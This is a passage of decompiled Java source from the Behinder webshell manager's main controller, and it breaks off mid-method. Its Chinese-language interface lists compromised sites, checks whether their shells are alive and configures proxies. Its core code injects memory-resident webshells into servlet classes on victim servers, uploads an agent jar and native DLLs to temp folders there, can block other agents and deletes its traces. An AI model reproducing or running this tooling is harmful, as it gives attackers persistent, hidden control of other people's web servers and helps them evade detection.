//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.Proxy.Type;
import java.security.SecureRandom;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Random;
import java.util.jar.JarEntry;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javafx.application.Platform;
import javafx.beans.property.SimpleObjectProperty;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.SelectionMode;
import javafx.scene.control.SeparatorMenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableRow;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.TreeItem;
import javafx.scene.control.TreeView;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.paint.Color;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.stage.Window;
import javassist.ByteArrayClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ICrypt;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.dao.TransProtocolDao;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.utils.OKHttpClientUtil;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class MainController {
    @FXML
    private TreeView treeview;
    @FXML
    private TableView shellListTable;
    @FXML
    private TableColumn idCol;
    @FXML
    private TableColumn urlCol;
    @FXML
    private TableColumn ipCol;
    @FXML
    private TableColumn typeCol;
    @FXML
    private TableColumn osCol;
    @FXML
    private TableColumn commentCol;
    @FXML
    private TableColumn addTimeCol;
    @FXML
    private TableColumn statusCol;
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private Label checkAliveBtn;
    @FXML
    private Label importBtn;
    @FXML
    private Label transProtocolBtn;
    @FXML
    private TextField searchShellTxt;
    @FXML
    private Label statusLabel;
    @FXML
    private Label versionLabel;
    @FXML
    private Label authorLabel;
    @FXML
    private Label searchShellLabel;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private TreeView catagoryTreeView;
    private ComboBox transProtocolCombo = new ComboBox();
    private ShellManager shellManager;
    private TransProtocolDao transProtocolDao;
    private Map<String, Map<String, Object>> targetClasses = new HashMap();
    public static Map<String, Object> currentProxy = new HashMap();
    private int COL_INDEX_URL = 0;
    private int COL_INDEX_IP = 1;
    private int COL_INDEX_TYPE = 2;
    private int COL_INDEX_OS = 3;
    private int COL_INDEX_COMMENT = 4;
    private int COL_INDEX_ADDTIME = 5;
    private int COL_INDEX_STATUS = 6;
    private int COL_INDEX_ID = 7;
    private int COL_INDEX_MEMTYPE = 8;

    public MainController() {
        try {
            this.shellManager = new ShellManager();
            this.transProtocolDao = new TransProtocolDao();
        } catch (Exception var2) {
            this.showErrorMessage("错误", "数据库文件丢失");
            System.exit(0);
        }

    }

    public void initialize() {
        try {
            this.initCatagoryList();
            this.initShellList();
            this.initToolbar();
            this.initBottomBar();
            this.initMemshellTargetClassMap();
            this.loadProxy();
        } catch (Exception var2) {
        }

    }

    private void initBottomBar() {
        String TIP_FOR_VERSION = "保留版权是对原创基本的尊重：）";
        this.versionLabel.setText(String.format(this.versionLabel.getText(), Constants.VERSION));
        this.authorLabel.setText(Constants.AUTHOR);
    }

    private void loadProxy() throws Exception {
        JSONObject proxyObj = this.shellManager.findProxy("default");
        int status = proxyObj.getInt("status");
        String type = proxyObj.getString("type");
        String ip = proxyObj.getString("ip");
        String port = proxyObj.get("port").toString();
        String username = proxyObj.getString("username");
        String password = proxyObj.getString("password");
        if (status == Constants.PROXY_ENABLE) {
            currentProxy.put("username", username);
            currentProxy.put("password", password);
            InetSocketAddress proxyAddr = new InetSocketAddress(ip, Integer.parseInt(port));
            Proxy proxy = null;
            if (type.equals("HTTP")) {
                proxy = new Proxy(Type.HTTP, proxyAddr);
                currentProxy.put("proxy", proxy);
            } else if (type.equals("SOCKS")) {
                proxy = new Proxy(Type.SOCKS, proxyAddr);
                currentProxy.put("proxy", proxy);
            }

            OKHttpClientUtil.setProxy(proxy);
            this.proxyStatusLabel.getGraphic().setVisible(true);
            this.proxyStatusLabel.setText("代理生效中");
        }

    }

    private void initIcons() {
        try {
            this.searchShellLabel.setGraphic(new ImageView(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/search.png")))));
        } catch (Exception var2) {
        }

    }

    private void initToolbar() {
        this.initIcons();
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> window.hide());
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing((double)10.0F);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap((double)15.0F);
            proxyGridPane.setPadding(new Insets((double)20.0F, (double)20.0F, (double)0.0F, (double)10.0F));
            Label typeLabel = new Label("类型：");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);

            try {
                JSONObject proxyObj = this.shellManager.findProxy("default");
                if (proxyObj != null) {
                    int status = proxyObj.getInt("status");
                    if (status == Constants.PROXY_ENABLE) {
                        enableRadio.setSelected(true);
                    } else if (status == Constants.PROXY_DISABLE) {
                        disableRadio.setSelected(true);
                    }

                    String type = proxyObj.getString("type");
                    if (type.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }

                    String ip = proxyObj.getString("ip");
                    String port = proxyObj.get("port").toString();
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = proxyObj.getString("username");
                    String password = proxyObj.getString("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }
            } catch (Exception var28) {
                this.statusLabel.setText("代理服务器配置加载失败。");
            }

            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    currentProxy.put("proxy", (Object)null);
                    OKHttpClientUtil.setProxy((Proxy)null);
                    this.proxyStatusLabel.getGraphic().setVisible(false);
                    this.proxyStatusLabel.setText("");

                    try {
                        this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_DISABLE);
                    } catch (Exception var12) {
                    }

                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    try {
                        this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_ENABLE);
                    } catch (Exception var13) {
                    }

                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        final String proxyPassword = passwordText.getText();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, proxyPassword.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator)null);
                    }

                    currentProxy.put("username", userNameText.getText());
                    currentProxy.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));
                    String type = typeCombo.getValue().toString();
                    Proxy proxy = null;
                    if (type.equals("HTTP")) {
                        proxy = new Proxy(Type.HTTP, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    } else if (type.equals("SOCKS")) {
                        proxy = new Proxy(Type.SOCKS, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    }

                    OKHttpClientUtil.setProxy(proxy);
                    this.proxyStatusLabel.getGraphic().setVisible(true);
                    this.proxyStatusLabel.setText("代理生效中");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });
            cancelBtn.setOnAction((e) -> inputDialog.getDialogPane().getScene().getWindow().hide());
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing((double)20.0F);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });
        this.checkAliveBtn.setOnMouseClicked((event) -> {
            Alert alert = new Alert(AlertType.CONFIRMATION);
            alert.setResizable(true);
            alert.setHeaderText("");
            alert.setContentText("请确认是否批量检测网站列表中所有站点的存活状态？");
            Optional<ButtonType> result = alert.showAndWait();
            if (result.get() != ButtonType.CANCEL) {
                int[] current = new int[]{0};
                int total = this.shellListTable.getItems().size();

                for(Object item : this.shellListTable.getItems()) {
                    Runnable runner = () -> {
                        int shellID = this.getShellID((ArrayList)item);
                        String shellUrl = this.getShellUrl((ArrayList)item);

                        try {
                            JSONObject shellEntity = this.shellManager.findShell(shellID);
                            ShellService shellService = new ShellService(shellEntity);
                            boolean isAlive = shellService.doConnect();
                            this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_ALIVE);
                        } catch (Exception var22) {
                            try {
                                this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_DEAD);
                            } catch (Exception var21) {
                            }
                        } finally {
                            Platform.runLater(() -> this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total)));
                            synchronized(this) {
                                int var10002 = current[0]++;
                            }

                            if (current[0] == total) {
                                Platform.runLater(() -> this.statusLabel.setText("全部检测完成。"));
                            }

                        }

                    };
                    Thread workThrad = new Thread(runner);
                    workThrad.start();
                }

            }
        });
        this.searchShellTxt.textProperty().addListener((observable, oldValue, newValue) -> {
            try {
                this.shellListTable.getItems().clear();
                JSONArray shellList = this.shellManager.findShellByUrl(newValue);
                this.fillShellRows(shellList);
            } catch (Exception var5) {
            }

        });
        this.importBtn.setOnMouseClicked((event) -> {
            try {
                this.importData();
            } catch (Exception e) {
                this.statusLabel.setText("导入失败：" + e.getMessage());
            }

        });
        this.transProtocolBtn.setOnMouseClicked((event) -> {
            FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/TransProtocolPane.fxml"));

            try {
                Parent transProtocolPane = (Parent)loader.load();
                TransProtocolPaneController transProtocolPaneController = (TransProtocolPaneController)loader.getController();
                transProtocolPaneController.init();
                Stage stage = new Stage();
                stage.setTitle("传输协议配置");
                stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
                Scene scene = new Scene(transProtocolPane);
                scene.getRoot().setStyle("-fx-font-family: 'Arial'");
                stage.setScene(scene);
                stage.show();
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
    }

    private boolean checkSingleAlive() {
        return true;
    }

    private void injectMemShell(int shellID, String type, String path, boolean isAntiAgent) {
        this.statusLabel.setText("正在植入内存马……");
        Runnable runner = () -> {
            try {
                if (!path.startsWith("/")) {
                    Platform.runLater(() -> {
                        Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
                        this.statusLabel.setText("内存马植入错误，路径必须以\"/\"开头");
                    });
                    return;
                }

                Pattern.compile(path);
                JSONObject shellEntity = this.shellManager.findShell(shellID);
                ShellService shellService = new ShellService(shellEntity);
                shellService.doConnect();
                String osInfo = shellEntity.getString("os");
                if (osInfo == null || osInfo.equals("")) {
                    int randStringLength = (new SecureRandom()).nextInt(3000);
                    String randString = Utils.getRandomString(randStringLength);
                    JSONObject basicInfoObj = new JSONObject(shellService.getBasicInfo(randString));
                    osInfo = (new String(Base64.getDecoder().decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
                }

                int osType = Utils.getOSType(osInfo);
                if (type.equals("AgentNoFile")) {
                    this.injectAgentNoFile(shellService, path, isAntiAgent);
                } else if (type.equals("Agent")) {
                    this.injectAgent(shellService, osType, path, isAntiAgent);
                }

                this.addMemShellRow(shellEntity, type, path);
            } catch (Exception e) {
                e.printStackTrace();
                Platform.runLater(() -> this.statusLabel.setText("注入失败：" + e.getMessage()));
            }

        };
        Thread worker = new Thread(runner);
        worker.start();
    }

    private void initMemshellTargetClassMap() {
        Map<String, Object> targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List<String> paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        this.targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Map<String, Object> targetClassJakartaMap = new HashMap();
        targetClassJakartaMap.put("methodName", "service");
        List<String> paramJakartaClsStrList = new ArrayList();
        paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
        paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
        targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
        this.targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        this.targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
        Map<String, Object> targetClassWeblogicMap = new HashMap();
        targetClassWeblogicMap.put("methodName", "execute");
        List<String> paramWeblogicClsStrList = new ArrayList();
        paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
        paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
        targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
        this.targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
    }

    private void injectAgentNoFile(ShellService shellService, String path, boolean isAntiAgent) throws Exception {
        JSONObject responseObj = shellService.getMemShellTargetClass();
        if (responseObj.getString("status").equals("success")) {
            JSONObject msgObj = new JSONObject(responseObj.getString("msg"));
            String className = msgObj.getString("className").replaceFirst("/", "").replace("/", ".").replace(".class", "");
            String classBody = msgObj.getString("classBody");
            byte[] targetClassByte = Base64.getDecoder().decode(classBody);
            ClassPool cp = ClassPool.getDefault();
            cp.insertClassPath(new ByteArrayClassPath(className, targetClassByte));
            CtClass targetClass = cp.get(className);
            Map targetClassMap = (Map)this.targetClasses.get(className);
            String methodName = targetClassMap.get("methodName").toString();
            List<String> paramList = (List)targetClassMap.get("paramList");
            List<CtClass> paramClasses = (List)paramList.stream().map((c) -> {
                CtClass ctClass = null;

                try {
                    ctClass = cp.get(c);
                } catch (NotFoundException e) {
                    e.printStackTrace();
                }

                return ctClass;
            }).collect(Collectors.toList());
            CtMethod ctMethod = targetClass.getDeclaredMethod(methodName, (CtClass[])paramClasses.toArray(new CtClass[paramClasses.size()]));
            ICrypt cryptor = shellService.getCryptor();
            ctMethod.insertBefore(String.format(className.startsWith("jakarta.") ? Constants.shellCodeWithDecrypt.replace("javax.servlet.", "jakarta.servlet.") : Constants.shellCodeWithDecrypt, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt"));
            targetClass.detach();
            byte[] hackedClass = targetClass.toBytecode();
            shellService.injectAgentNoFileMemShell(className, Base64.getEncoder().encodeToString(hackedClass), isAntiAgent);
        }

    }

    private byte[] personalizedAgentJar(String jarPath, String path, String decryptClassStr, String decryptName) throws Exception {
        Map<String, String> params = new HashMap();
        params.put("path", path);
        params.put("decryptClassStr", decryptClassStr);
        params.put("decryptName", decryptName);
        params.put("shellCode", Constants.shellCodeWithDecrypt);
        String inJarFilePath = "net/rebeyond/behinder/payload/java/MemShell.class";
        String oldMemShellClsName = "net/rebeyond/behinder/payload/java/MemShell";
        String newMemShellClsName = Utils.getRandomClassName(oldMemShellClsName);
        byte[] entryBytes = Params.getParamedClass(Utils.getResourceData("net/rebeyond/behinder/resource/tools/MemShell.class"), params, newMemShellClsName);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ZipOutputStream zipOutputStream = new ZipOutputStream(bos);
        ZipInputStream zipInputStream = new ZipInputStream(new ByteArrayInputStream(Utils.getResourceData(jarPath)));

        for(ZipEntry entry = zipInputStream.getNextEntry(); entry != null; entry = zipInputStream.getNextEntry()) {
            if (entry.getName().equals(inJarFilePath)) {
                zipOutputStream.putNextEntry(new ZipEntry(newMemShellClsName + ".class"));
                zipOutputStream.write(entryBytes);
                zipOutputStream.closeEntry();
            } else if (entry.getName().equals("META-INF/MANIFEST.MF")) {
                zipOutputStream.putNextEntry(new JarEntry(entry.getName()));
                ByteArrayOutputStream contentBos = new ByteArrayOutputStream();
                byte[] content = new byte[(int)entry.getSize()];

                for(int length = zipInputStream.read(content); length > 0; length = zipInputStream.read(content)) {
                    contentBos.write(content, 0, length);
                }

                byte[] contentBytes = contentBos.toByteArray();
                contentBytes = Utils.replaceBytes(contentBytes, oldMemShellClsName.replace("/", ".").getBytes(), newMemShellClsName.replace("/", ".").getBytes());
                zipOutputStream.write(contentBytes);
                zipOutputStream.closeEntry();
            } else {
                zipOutputStream.putNextEntry(new JarEntry(entry.getName()));
                byte[] content = new byte[(int)entry.getSize()];

                for(int length = zipInputStream.read(content); length > 0; length = zipInputStream.read(content)) {
                    zipOutputStream.write(content, 0, length);
                }

                zipOutputStream.closeEntry();
            }
        }

        zipOutputStream.close();
        return bos.toByteArray();
    }

    private void injectAgent(ShellService shellService, int osType, String path, boolean isAntiAgent) throws Exception {
        String libPath = Utils.getRandomString(6);
        if (osType == Constants.OS_TYPE_WINDOWS) {
            libPath = "c:/windows/temp/" + libPath;
        } else {
            libPath = "/tmp/" + libPath;
        }

        String jarPath = "net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar";
        ICrypt cryptor = shellService.getCryptor();
        byte[] personalizedJarBytes = this.personalizedAgentJar(jarPath, path, Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()), "Decrypt");
        shellService.uploadFile(libPath, personalizedJarBytes, true);
        shellService.loadJar(libPath);
        shellService.injectAgentMemShell(libPath, path, Utils.getKey("rebeyond"), isAntiAgent);
        if (osType == Constants.OS_TYPE_WINDOWS) {
            try {
                JSONObject basicInfoMap = new JSONObject(shellService.getBasicInfo(Utils.getWhatever()).getString("msg"));
                String arch = (new String(Base64.getDecoder().decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
                String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
                if (arch.indexOf("64") >= 0) {
                    byte[] nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                    shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                    shellService.freeFile(remoteUploadPath, libPath);
                    if (isAntiAgent) {
                        shellService.antiAgent(remoteUploadPath);
                    }

                    shellService.deleteFile(remoteUploadPath);
                } else {
                    byte[] nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
                    shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                    shellService.freeFile(remoteUploadPath, libPath);
                    if (isAntiAgent) {
                        shellService.antiAgent(remoteUploadPath);
                    }

                    shellService.deleteFile(remoteUploadPath);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    private void addMemShellRow(JSONObject shellEntity, String type, String path) {
        try {
            String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
            shellEntity.put("url", memUrl);
            int memType = this.getMemTypeFromType(type);
            shellEntity.put("memType", memType);
            this.addShell(shellEntity);
            this.loadShellList();
            this.shellListTable.getSelectionModel().select(this.shellListTable.getItems().size() - 1);
            Platform.runLater(() -> this.statusLabel.setText("注入完成。"));
        } catch (Exception e) {
            Platform.runLater(() -> this.statusLabel.setText("注入完成，但是shell入库失败：" + e.getMessage()));
        }

    }

    private void clearRemoteDll() {
    }

    private void initCatagoryList() throws Exception {
        this.initCatagoryTree();
        this.initCatagoryMenu();
    }

    private void initShellList() throws Exception {
        this.initShellTable();
        this.loadShellList();
        this.loadContextMenu();
    }

    private void initShellTable() throws Exception {
        this.shellListTable.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);
        ObservableList<TableColumn<List<StringProperty>, ?>> tcs = this.shellListTable.getColumns();

        for(int i = 1; i < tcs.size(); ++i) {
            int j = i - 1;
            ((TableColumn)tcs.get(i)).setCellValueFactory((data) -> {
                return (StringProperty) ((List) ((TableColumn.CellDataFeatures) data).getValue()).get(j);
            });

        }

        this.idCol.setCellFactory((col) -> {
            TableCell<Alert, String> cell = new TableCell<Alert, String>() {
                public void updateItem(String item, boolean empty) {
                    super.updateItem(item, empty);
                    this.setText((String)null);
                    this.setGraphic((Node)null);
                    if (!empty) {
                        int rowIndex = this.getIndex() + 1;
                        this.setText(String.valueOf(rowIndex));
                        this.setAlignment(Pos.CENTER);
                    }

                }
            };
            return cell;
        });
        this.statusCol.setCellFactory((col) -> {
            TableCell<Alert, String> cell = new TableCell<Alert, String>() {
                public void updateItem(String item, boolean empty) {
                    super.updateItem(item, empty);
                    if (empty) {
                        this.setGraphic((Node)null);
                    } else {
                        Object rowItem = this.getTableRow().getItem();
                        if (rowItem == null) {
                            this.setGraphic((Node)null);
                        } else {
                            try {
                                String memType = ((StringProperty)((List)this.getTableRow().getItem()).get(MainController.this.COL_INDEX_MEMTYPE)).getValue();
                                String iconPath = null;
                                if (item.equals("0")) {
                                    if (memType.equals("0")) {
                                        iconPath = "net/rebeyond/behinder/resource/alive.png";
                                    } else {
                                        iconPath = "net/rebeyond/behinder/resource/memshell_alive.png";
                                    }
                                } else if (item.equals("1")) {
                                    if (memType.equals("0")) {
                                        iconPath = "net/rebeyond/behinder/resource/dead.png";
                                    } else {
                                        iconPath = "net/rebeyond/behinder/resource/memshell_dead.png";
                                    }
                                }

                                Image image = new Image(new ByteArrayInputStream(Utils.getResourceData(iconPath)));
                                this.setGraphic(new ImageView(image));
                                this.setAlignment(Pos.CENTER);
                            } catch (Exception e) {
                                e.printStackTrace();
                                this.setText(item);
                            }

                        }
                    }
                }
            };
            return cell;
        });
        this.shellListTable.setRowFactory((tv) -> {
            TableRow<List<StringProperty>> row = new TableRow();
            row.setOnMouseClicked((event) -> {
                if (event.getClickCount() == 2 && !row.isEmpty()) {
                    String url = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_URL)).getValue();
                    String shellID = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_ID)).getValue();

                    try {
                        this.openShell(url, shellID, false);
                    } catch (Exception e) {
                        e.printStackTrace();
                        this.statusLabel.setText("shell打开失败。");
                    }
                }

            });
            return row;
        });
    }

    private boolean checkUrl(String urlString) {
        try {
            new URL(urlString.trim());
            return true;
        } catch (Exception var3) {
            this.showErrorMessage("错误", "URL格式错误");
            return false;
        }
    }

    private boolean checkPassword(String password) {
        if (password.length() > 255) {
            this.showErrorMessage("错误", "密码长度不应大于255个字符");
            return false;
        } else if (password.length() < 1) {
            this.showErrorMessage("错误", "密码不能为空，请输入密码");
            return false;
        } else {
            return true;
        }
    }

    private boolean checkTransProtocolId(ComboBox transProtocolCombo) {
        if (transProtocolCombo.getUserData() != null && transProtocolCombo.getValue() != null) {
            return true;
        } else {
            this.showErrorMessage("错误", "传输协议不能为空");
            return false;
        }
    }

    private void showShellDialog(int shellID) throws Exception {
        Alert alert = new Alert(AlertType.NONE);
        alert.setResizable(true);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((ex) -> window.hide());
        alert.setTitle("新增Shell");
        Stage stage = (Stage)alert.getDialogPane().getScene().getWindow();
        stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
        alert.setHeaderText("");
        TextField urlText = new TextField();
        TextField passText = new TextField();
        ComboBox shellTypeCombo = new ComboBox();
        ObservableList<String> typeList = FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp", "dotnetCore"});
        shellTypeCombo.setItems(typeList);
        ToggleGroup transTypeGroup = new ToggleGroup();
        RadioButton legacyRadio = new RadioButton("默认");
        legacyRadio.setUserData("legacy");
        RadioButton customizedRadio = new RadioButton("自定义");
        customizedRadio.setUserData("customized");
        legacyRadio.setToggleGroup(transTypeGroup);
        customizedRadio.setToggleGroup(transTypeGroup);
        Label typeTipLabel = new Label();
        typeTipLabel.setText("* 默认：使用冰蝎v3.0内置加密模式");
        typeTipLabel.setTextFill(Color.RED);
        HBox transTypeHbox = new HBox();
        transTypeHbox.setSpacing((double)10.0F);
        transTypeHbox.getChildren().add(legacyRadio);
        transTypeHbox.getChildren().add(customizedRadio);
        transTypeHbox.getChildren().add(typeTipLabel);
        ComboBox shellCatagory = new ComboBox();

        try {
            JSONArray catagoryArr = this.shellManager.listCatagory();
            ObservableList<String> catagoryList = FXCollections.observableArrayList();

            for(int i = 0; i < catagoryArr.length(); ++i) {
                JSONObject catagoryObj = catagoryArr.getJSONObject(i);
                catagoryList.add(catagoryObj.getString("name"));
            }

            shellCatagory.setItems(catagoryList);
            shellCatagory.getSelectionModel().select(0);
        } catch (Exception e) {
            e.printStackTrace();
        }

        TextArea header = new TextArea();
        header.setPromptText("请输入自定义请求头Key:value对，一行一个，如：User-Agent: Just_For_Fun");
        header.setPrefHeight((double)100.0F);
        TextArea comment = new TextArea();
        comment.setPromptText("请输入备注信息");
        comment.setPrefHeight((double)50.0F);
        GridPane vpsInfoPane = new GridPane();
        GridPane.setMargin(vpsInfoPane, new Insets((double)20.0F, (double)0.0F, (double)0.0F, (double)0.0F));
        vpsInfoPane.setVgap((double)10.0F);
        vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
        vpsInfoPane.add(new Label("URL："), 0, 0);
        vpsInfoPane.add(urlText, 1, 0);
        vpsInfoPane.add(new Label("脚本类型："), 0, 1);
        vpsInfoPane.add(shellTypeCombo, 1, 1);
        vpsInfoPane.add(new Label("加密类型："), 0, 2);
        vpsInfoPane.add(transTypeHbox, 1, 2);
        vpsInfoPane.add(new Label("连接密码："), 0, 3);
        vpsInfoPane.add(new Label("分类："), 0, 4);
        vpsInfoPane.add(shellCatagory, 1, 4);
        vpsInfoPane.add(new Label("自定义请求头："), 0, 5);
        vpsInfoPane.add(header, 1, 5);
        vpsInfoPane.add(new Label("备注："), 0, 6);
        vpsInfoPane.add(comment, 1, 6);
        transTypeGroup.selectedToggleProperty().addListener((obs, ov, newValue) -> {
            if (newValue.getUserData().equals("legacy")) {
                typeTipLabel.setText("* 默认：使用冰蝎v3.0内置加密模式");
                ((Label)vpsInfoPane.getChildren().get(6)).setText("连接密码：");
                vpsInfoPane.getChildren().remove(this.transProtocolCombo);
                vpsInfoPane.add(passText, 1, 3);
            } else if (newValue.getUserData().equals("customized")) {
                typeTipLabel.setText("* 自定义：使用自定义传输协议进行加解密");
                ((Label)vpsInfoPane.getChildren().get(6)).setText("传输协议：");
                vpsInfoPane.getChildren().remove(passText);
                vpsInfoPane.add(this.transProtocolCombo, 1, 3);
            }

        });
        if (shellID != -1) {
            JSONObject shellObj = this.shellManager.findShell(shellID);
            String shellType = shellObj.getString("type");
            if (shellObj.getInt("transProtocolId") < 0) {
                transTypeGroup.selectToggle(legacyRadio);
